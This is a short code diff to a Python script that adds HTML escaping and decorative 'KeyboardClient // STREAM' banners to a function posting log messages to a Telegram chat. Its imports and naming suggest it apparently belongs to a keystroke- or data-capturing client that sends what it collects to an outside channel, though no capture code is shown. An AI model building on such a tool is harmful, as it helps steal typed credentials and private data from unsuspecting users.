@@ -6,6 +6,7 @@ import atexit
 import base64
 import gzip
 import getpass
+import html
 import hashlib
 import platform
 import shutil
@@ -114,10 +115,15 @@ def send_telegram_log(message):
     text = str(message).strip()
     if not text:
         return
+    escaped = html.escape(text)
     try:
         payload = json.dumps({
             "chat_id": TELEGRAM_CHAT_ID,
-            "text": f"<b>📋 Log</b>\n<code>{text[:4000]}</code>",
+            "text": (
+                "<b>┌─[ LOG // CLIENT ]</b>\n"
+                f"<pre>{escaped[:3900]}</pre>\n"
+                "<b>└─[ KeyboardClient // STREAM ]</b>"
+            ),
             "parse_mode": "HTML",
         }).encode("utf-8")
         request = Request(
